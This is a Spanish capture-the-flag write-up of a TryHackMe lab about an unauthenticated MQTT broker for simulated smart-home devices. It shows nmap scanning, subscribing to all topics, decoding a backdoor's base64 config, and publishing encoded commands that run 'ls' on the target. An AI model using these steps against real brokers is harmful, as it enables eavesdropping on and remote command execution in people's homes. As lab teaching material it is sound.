# Bugged(MQTT,THM)
#Org-TryHackMe

#Status-Done 

#MQTT

#IoT
# Descripción

Bugged es un laboratorio de tryhackme que simula como los dispositivos inteligentes que tenemos en nuestras casas se comunican y como pueden ser vulnerables debido a malas configuraciones.

![Untitled](Bugged(MQTT,THM)/Untitled.png)

## ¿Qué es MQTT?

MQTT es un protocolo de mensajería que utiliza un enfoque de publicación/suscripción para la comunicación entre los dispositivos conectados. 

# Recon

Escaneando los puertos del equipo se puede observar que utiliza el protocolo MQTT. Podemos ver alguno de los tópicos y sus publicaciones, esto es debido a una mala configuración, ya que para subscribirse a los tópicos no se requiere de autenticación.

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC 10.10.83.103 -p-   
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-08 19:44 EST
Nmap scan report for 10.10.83.103
Host is up (0.059s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE                  VERSION
1883/tcp open  mosquitto version 2.0.14
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     $SYS/broker/load/messages/sent/15min: 132.36
|     $SYS/broker/load/messages/sent/5min: 148.99
|     patio/lights: {"id":13450064615390845532,"color":"GREEN","status":"ON"}
|     $SYS/broker/load/sockets/15min: 0.78
|     $SYS/broker/bytes/received: 291554
|     $SYS/broker/load/bytes/received/15min: 4311.03
|     $SYS/broker/load/sockets/5min: 1.09
|     $SYS/broker/load/bytes/sent/15min: 3854.68
|     $SYS/broker/publish/bytes/received: 206700
|     $SYS/broker/load/connections/5min: 0.75
|     $SYS/broker/retained messages/count: 38
|     kitchen/toaster: {"id":4296689929067490304,"in_use":false,"temperature":148.23627,"toast_time":320}
|     $SYS/broker/load/publish/sent/1min: 88.81
|     $SYS/broker/publish/messages/sent: 1494
|     $SYS/broker/store/messages/count: 39
|     $SYS/broker/subscriptions/count: 6
|     $SYS/broker/publish/bytes/sent: 95737
|     livingroom/speaker: {"id":8399132638921082018,"gain":59}
|     $SYS/broker/store/messages/bytes: 330
|     $SYS/broker/messages/stored: 39
|     $SYS/broker/load/connections/15min: 0.65
|     $SYS/broker/load/connections/1min: 2.38
|     $SYS/broker/clients/total: 4
|     $SYS/broker/version: mosquitto version 2.0.14
|     $SYS/broker/messages/sent: 7628
|     storage/thermostat: {"id":2292674643183825823,"temperature":23.678448}
|     $SYS/broker/load/bytes/received/1min: 4361.09
|     $SYS/broker/load/bytes/received/5min: 4307.59
|     $SYS/broker/load/sockets/1min: 3.40
|     $SYS/broker/bytes/sent: 154007
|     $SYS/broker/load/bytes/sent/5min: 4853.43
|     $SYS/broker/messages/received: 6200
|     $SYS/broker/load/messages/sent/1min: 181.81
|     $SYS/broker/load/messages/received/1min: 93.30
|     $SYS/broker/load/publish/sent/5min: 57.11
|     $SYS/broker/load/publish/sent/15min: 41.32
|     $SYS/broker/load/messages/received/15min: 91.69
|     $SYS/broker/clients/connected: 3
|     $SYS/broker/clients/active: 3
|     $SYS/broker/load/bytes/sent/1min: 6206.88
|     $SYS/broker/load/messages/received/5min: 92.12
|_    $SYS/broker/uptime: 3993 seconds

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.30 seconds
```

Sabiendo que hay algunos tópicos que no requieren de authenticación, vamos a escuchar todos los tópicos que no requieran de ella.

```bash
mosquitto_sub -t '#' -h 10.10.83.103 -v
```

> -t ‘#’ (Sirve para escuchar todos los topicos, o un topico en concreto)
>  -h IP (Ip del MQTT)
>  -v (Verbose mode)

```bash
┌──(kali㉿kali)-[~]
└─$ mosquitto_sub -t '#' -h 10.10.83.103 -v
storage/thermostat {"id":14542060287344178663,"temperature":23.627169}
livingroom/speaker {"id":228475588187167133,"gain":62}
kitchen/toaster {"id":4354901113821836059,"in_use":false,"temperature":157.60037,"toast_time":199}
storage/thermostat {"id":5145269934709152454,"temperature":24.291834}
patio/lights {"id":7928715270120595881,"color":"PURPLE","status":"OFF"}
frontdeck/camera {"id":12101185314309546723,"yaxis":137.46451,"xaxis":-14.20517,"zoom":0.9130872,"movement":false}
livingroom/speaker {"id":7998105205519468684,"gain":44}
storage/thermostat {"id":17049630188281972557,"temperature":23.023586}
kitchen/toaster {"id":18236427340520294046,"in_use":false,"temperature":153.60626,"toast_time":342}
patio/lights {"id":7239207803758781648,"color":"PURPLE","status":"OFF"}
livingroom/speaker {"id":3459444945799854247,"gain":68}
storage/thermostat {"id":16132263354363376435,"temperature":23.96116}
patio/lights {"id":2520453853733614087,"color":"RED","status":"ON"}
frontdeck/camera {"id":5104873236420027513,"yaxis":177.43738,"xaxis":72.826355,"zoom":0.69228655,"movement":false}
storage/thermostat {"id":17031331406259833386,"temperature":23.835253}
kitchen/toaster {"id":4036233390755825463,"in_use":true,"temperature":154.69026,"toast_time":129}
livingroom/speaker {"id":13002264674736278265,"gain":74}
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
storage/thermostat {"id":13564564440425379963,"temperature":23.726637}
livingroom/speaker {"id":4605785484328167113,"gain":58}
patio/lights {"id":5540241046223153515,"color":"GREEN","status":"ON"}
kitchen/toaster {"id":5294056949280766076,"in_use":true,"temperature":149.89319,"toast_time":141}
storage/thermostat {"id":15428830024999814562,"temperature":24.151302}
frontdeck/camera {"id":18384723226709614276,"yaxis":-59.22648,"xaxis":54.74568,"zoom":2.0344522,"movement":false}
livingroom/speaker {"id":14221066022264406767,"gain":50}
patio/lights {"id":8353637170676195955,"color":"GREEN","status":"OFF"}
storage/thermostat {"id":2636633732245715773,"temperature":24.1134}
kitchen/toaster {"id":12419983373386450258,"in_use":true,"temperature":159.88445,"toast_time":347}
livingroom/speaker {"id":18398160408882539825,"gain":61}
storage/thermostat {"id":5411455599525937250,"temperature":23.778364}
patio/lights {"id":16399010197849104495,"color":"PURPLE","status":"OFF"}
frontdeck/camera {"id":13439560994363962262,"yaxis":100.28021,"xaxis":111.76721,"zoom":0.110681064,"movement":true}
kitchen/toaster {"id":12269415397181195181,"in_use":false,"temperature":158.81837,"toast_time":339}
livingroom/speaker {"id":15191329915333182993,"gain":52}
storage/thermostat {"id":10540214407375111361,"temperature":23.119976}
```

Aquí se puede observar todos los tópicos que se pueden escuchar sin autenticación. En este caso hay dispositivos para las luces del patio, el altavoz del salón, la tostadora de la cocina, etc. Pero hay uno que llama mucho la atención.

```bash
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==

```

Es un mensaje en base64 el cual nos proporciona esta informacion

```bash
┌──(kali㉿kali)-[~]
└─$ echo 'eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==' |base64 -d
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}
```

Nos dice que hay un topico para subscribirse y otro para publicar. Por lo que nos vamos a subscribir al topico de las publicaciones *U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub*

```bash
┌──(kali㉿kali)-[~]
└─$ mosquitto_sub -t 'U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub' -h 10.10.83.103 -v
```

En este caso le estamos indicando que queremos subscribirnos/escuchar el canal donde se publica, por lo que vamos a publicar algo. Para publicar algo utilizaremos mosquitto_pub, añadiendo el parametro -m para publicar el mensaje que queramos

```bash
┌──(kali㉿kali)-[~]
└─$ mosquitto_pub -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -h 10.10.83.103 -m "W1C3"
```
![mqtt.gif](Bugged(MQTT,THM)/iot.gif)
De nuevo nos devuelve otro base64, el cual nos indica que el formato del mensaje esta mal y nos muestra como debemos publicar los mensajes

```bash
┌──(kali㉿kali)-[~]
└─$ echo 'SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=' |base64 -d
Invalid message format.
Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})
```

Por lo que vamos a adaptarnos al formato de mensaje.

```bash
┌──(kali㉿kali)-[~]
└─$ echo '{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls"}' |base64
eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQo=
```

En este caso lo que he añadido es el id, que me devolvio el primer base64, y le estoy indicando que me ejecute un ls.

Esto nos devuelve este base64 proporcionandonos el listado de archivos
```bash
echo "eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQo=" | base64 -d  
{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag.txt\n"}
```

![mqtt.gif](Bugged(MQTT,THM)/iot2.gif)
